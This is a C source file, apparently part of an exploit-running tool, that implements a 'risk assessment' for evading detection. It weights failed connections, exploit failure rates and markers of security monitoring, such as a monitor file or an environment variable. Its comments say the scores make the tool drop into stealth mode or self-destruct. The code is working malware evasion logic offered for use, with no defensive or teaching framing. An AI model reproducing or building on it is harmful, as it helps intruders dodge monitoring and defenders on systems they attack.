#include "risk_assessment.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Global counters for behavioral signals
static int failed_connections = 0;
static int failed_operations = 0;
static int successful_operations = 0;

/**
 * Collect Network Detection Signals
 * Gathers network-based indicators of detection or blocking.
 * 
 * @return Number of failed network connections (proxy for detection risk).
 * 
 * @note Higher failed connection counts suggest network-based blocking or monitoring.
 */
static int collect_network_signals(void) {
    return failed_connections;
}

/**
 * Collect System Detection Signals
 * Checks for indicators of monitored or high-security environments.
 * 
 * Detection Methods:
 *   - /etc/.security-monitor file existence (indicates security monitoring)
 *   - HIGH_RISK_SERVER environment variable (explicit high-risk marking)
 * 
 * @return 10 if high-risk indicators found (triggers immediate self-destruct),
 *         0 if no indicators found.
 */
static int collect_system_signals(void) {
    if (access("/etc/.security-monitor", F_OK) == 0) {
        return 10;
    }
    
    if (getenv("HIGH_RISK_SERVER") != NULL) {
        return 10;
    }
    
    return 0;
}

/**
 * Collect Behavioral Detection Signals
 * Calculates operation failure rate as indicator of detection or blocking.
 * 
 * @return Risk score 0-10 based on failure rate.
 *         Formula: (failed_operations / total_operations) * 10
 * 
 * @note High failure rates suggest operations are being blocked or detected.
 * @note Returns 0 if no operations have been attempted yet (avoids division by zero).
 */
static int collect_behavioral_signals(void) {
    int total_ops = failed_operations + successful_operations;
    if (total_ops == 0) return 0;
    
    double failure_rate = (double)failed_operations / total_ops;
    return (int)(failure_rate * 10);
}

/**
 * Calculate Network Risk Score
 * Maps failed connection count to risk score using tiered thresholds.
 * 
 * @param failed_conns Number of failed network connections.
 * @return Risk score 0-10:
 *         - 0 failures: 0 (no risk)
 *         - 1-2 failures: 2 (low risk)
 *         - 3-5 failures: 5 (moderate risk)
 *         - 6-10 failures: 8 (high risk)
 *         - 11+ failures: 10 (maximum risk)
 */
static int calculate_network_risk(int failed_conns) {
    if (failed_conns == 0) return 0;
    if (failed_conns <= 2) return 2;
    if (failed_conns <= 5) return 5;
    if (failed_conns <= 10) return 8;
    return 10;
}

/**
 * Calculate System Risk Score
 * Direct mapping of system signal to risk score (no transformation).
 * 
 * @param sys_signal System signal value (0 or 10).
 * @return Risk score 0-10 (pass-through).
 */
static int calculate_system_risk(int sys_signal) {
    return sys_signal;
}

/**
 * Calculate Behavioral Risk Score
 * Direct mapping of behavioral signal to risk score (no transformation).
 * 
 * @param beh_signal Behavioral signal value (0-10 from failure rate).
 * @return Risk score 0-10 (pass-through).
 */
static int calculate_behavioral_risk(int beh_signal) {
    return beh_signal;
}

/**
 * Assess Current Risk Level
 * Evaluates detection signals from multiple sources and calculates weighted total risk.
 * 
 * Risk Calculation:
 *   - Individual scores: Network (0-10), System (0-10), Behavioral (0-10)
 *   - Weighted combination: Network 40%, System 30%, Behavioral 30%
 *   - High-risk override: If system_risk >= 10, force total_risk = 10 (immediate self-destruct)
 *   - Clamped to valid range [0, 10]
 * 
 * Risk Thresholds (used by main loop for degradation mode selection):
 *   - total_risk < 4:  Normal mode (proceed with full operations)
 *   - total_risk 4-6:  Stealth mode (reduce activity, longer delays)
 *   - total_risk >= 7: Self-destruct mode (critical risk, exit immediately)
 * 
 * @return Risk assessment structure containing total_risk and individual component scores.
 * 
 * @note Called before each operation cycle to evaluate safety of continuing.
 * @note System risk >= 10 triggers immediate self-destruct regardless of other scores.
 */
risk_assessment_t assess_risk(void) {
    risk_assessment_t risk = {0};
    
    int net_signal = collect_network_signals();
    int sys_signal = collect_system_signals();
    int beh_signal = collect_behavioral_signals();
    
    risk.network_risk = calculate_network_risk(net_signal);
    risk.system_risk = calculate_system_risk(sys_signal);
    risk.behavioral_risk = calculate_behavioral_risk(beh_signal);
    
    if (risk.system_risk >= 10) {
        risk.total_risk = 10;
        return risk;
    }
    
    risk.total_risk = (int)(
        (risk.network_risk * 0.40) +
        (risk.system_risk * 0.30) +
        (risk.behavioral_risk * 0.30)
    );
    
    if (risk.total_risk > 10) risk.total_risk = 10;
    if (risk.total_risk < 0) risk.total_risk = 0;
    
    return risk;
}

/**
 * Update Failed Connection Counter
 * Increments the count of failed network connections for risk assessment.
 * 
 * @note Called when a network connection fails (e.g., connection refused, timeout).
 */
void update_failed_connection(void) {
    failed_connections++;
}

/**
 * Update Failed Operation Counter
 * Increments the count of failed operations for behavioral risk calculation.
 * 
 * @note Called when a CVE execution handler fails (e.g., exploit unsuccessful).
 */
void update_failed_operation(void) {
    failed_operations++;
}

/**
 * Update Successful Operation Counter
 * Increments the count of successful operations for behavioral risk calculation.
 * 
 * @note Called when a CVE execution handler succeeds (e.g., exploit successful).
 */
void update_successful_operation(void) {
    successful_operations++;
}

